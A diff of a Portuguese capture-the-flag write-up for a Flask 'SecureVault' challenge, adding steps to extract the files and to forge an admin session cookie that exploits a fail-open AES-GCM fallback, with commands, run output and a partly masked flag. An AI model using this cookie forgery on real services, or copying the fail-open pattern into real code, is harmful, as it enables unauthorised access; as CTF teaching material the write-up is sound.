@@ -19,7 +19,7 @@ O cookie de sessão é cifrado com AES-GCM (chave aleatória de 32 bytes que eu 
 
 > SecureVault. Sessões protegidas por criptografia autenticada AES-GCM. Guest access: guest / guest123.
 
-**Arquivos / instância:** `app.py` (Flask) e um endpoint. Na minha instância o host era `e22327817c4ca081.chal.ctf.ae` (HTTP). Login de convidado `guest/guest123` dá `role=viewer`; o dashboard só mostra a "Admin Recovery Key" (a flag) para `role=admin`.
+**Arquivos / instância:** `app.py` (Flask) e um endpoint. Na minha instância o host era `e22327817c4ca081.chal.ctf.ae`. O painel anunciava HTTP, mas na prática só o HTTPS respondeu (ver etapa 4). Login de convidado `guest/guest123` dá `role=viewer`; o dashboard só mostra a "Admin Recovery Key" (a flag) para `role=admin`.
 
 ## Dicas progressivas
 
@@ -34,14 +34,42 @@ O cookie de sessão é cifrado com AES-GCM (chave aleatória de 32 bytes que eu 
 ***INSERIR no terminal: Kali (atacante)
 
 ```bash
-export TARGET=http://e22327817c4ca081.chal.ctf.ae
+export TARGET=https://e22327817c4ca081.chal.ctf.ae
 ```
 
-Na minha instância era esse host. Use o da sua (o script lê `TARGET`).
+Na minha instância era esse host (via HTTPS, ver etapa 4). Use o da sua (o script lê `TARGET`).
 
 ## Resolução
 
-### 1. Revisão do código: o fallback inseguro
+### 1. Extração dos arquivos
+
+O desafio entrega um `public.zip` (senha `infected`). O `unzip` recusou:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+unzip -P infected -o public.zip -d loot/extracted
+```
+
+```text
+   skipping: app.py                  unsupported compression method 99
+```
+
+**Isso não funcionou** (pule ao replicar): zip AES ("method 99"), que o `unzip` não abre. Usei o `7z`:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+7z x -pinfected public.zip -oloot/extracted -y && find loot/extracted -maxdepth 4 -type f
+```
+
+```text
+loot/extracted/app.py
+```
+
+Um único arquivo: o `app.py`. É nele que mora o bug.
+
+### 2. Revisão do código: o fallback inseguro
 
 #### `app.py`
 
@@ -72,7 +100,7 @@ if role == "admin":
 > [!TIP]
 > **Conceito: fail-open (falhar aberto) em criptografia autenticada.** AES-GCM é AEAD: sem a chave, você não forja um ciphertext com tag válido. A segurança depende de que, quando a verificação falha, o pedido seja **rejeitado**. Um `except` que troca o dado autenticado por um dado controlado pelo cliente é "falhar aberto": o atacante só precisa fazer a verificação falhar (o que é trivial) para cair no caminho sem checagem. Referência: [OWASP: Error Handling / fail securely](https://owasp.org/www-community/Fail_securely).
 
-### 2. Forjando o cookie
+### 3. Forjando o cookie
 
 Qualquer coisa que não seja um blob GCM válido cai no fallback. O cookie mais simples é o base64 de um JSON com `role=admin`. Script completo, idêntico ao arquivo em `scripts/`:
 
@@ -174,6 +202,26 @@ if __name__ == "__main__":
     main()
 ```
 
+### 4. Exploração: HTTP recusa, HTTPS entrega
+
+Rodei primeiro apontando para `http://` (que o painel anunciava). A conexão foi recusada:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+TARGET=http://e22327817c4ca081.chal.ctf.ae python3 scripts/script1.py
+```
+
+```text
+[*] Target: http://e22327817c4ca081.chal.ctf.ae
+[*] Cookie session_token: eyJ1c2VyIjoiZ3VlcnJlaXJvIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzMTc1NTY3fQ==
+Traceback (most recent call last):
+  ...
+urllib3 ... create_connection ... (conexão recusada)
+```
+
+**Isso não funcionou** (pule ao replicar): o alvo não atende em HTTP puro. Apontei para `https://` e o cookie forjado passou de primeira:
+
 ***INSERIR no terminal: Kali (atacante)
 
 ```bash
@@ -181,6 +229,7 @@ python3 scripts/script1.py
 ```
 
 ```text
+[*] Target: https://e22327817c4ca081.chal.ctf.ae
 [*] Sessão forjada: {'user': 'guerreiro', 'role': 'admin', 'iat': 1783175611}
 [*] Cookie session_token: eyJ1c2VyIjoiZ3VlcnJlaXJvIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzMTc1NjExfQ==
 Status: 200
@@ -189,7 +238,7 @@ Status: 200
 [+] FLAG ENCONTRADA: flag{0eacf61d486XXXXX}
 ```
 
-O mesmo em `curl`, se preferir sem script (o cookie é fixo, já em base64):
+O GCM falhou (meu cookie não é um blob autenticado), o `except` leu meu JSON em claro, o `role=admin` passou e o dashboard imprimiu a flag. O mesmo em `curl`, se preferir sem script (o cookie é fixo, já em base64):
 
 ***INSERIR no terminal: Kali (atacante)
 
